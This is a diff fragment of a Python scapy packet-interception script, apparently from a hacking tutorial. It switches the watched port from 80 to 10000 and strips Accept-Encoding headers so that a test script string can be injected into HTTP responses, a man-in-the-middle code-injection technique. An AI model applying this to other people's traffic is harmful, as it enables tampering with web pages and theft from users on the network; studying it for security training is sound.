@@ -15,11 +15,11 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[scapy.TCP].dport == 10000:
             print("[+] Request")
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 10000:
             print("[+] Response")
             #print(scapy_packet.show())
             injection_code = "<script>alert('test');</script>"
